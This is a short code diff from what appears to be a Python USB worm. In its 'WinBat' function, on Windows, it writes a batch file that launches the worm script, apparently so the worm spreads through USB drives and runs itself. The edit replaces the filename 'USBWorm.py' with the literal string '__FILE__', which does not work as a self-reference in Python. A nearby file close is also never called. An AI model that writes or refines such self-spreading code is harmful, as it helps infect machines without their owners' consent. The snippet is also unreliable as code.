@@ -76,7 +76,7 @@ def WinBat():
 			if os.name == 'nt':
 				fp = open(batch, 'w+')
 				time.sleep(1)
-				command = "start C:\Python27\python.exe USBWorm.py"
+				command = "start C:\Python27\python.exe __FILE__"
 				fp.write(command)
 				fp.close
 				USBCount -= 1
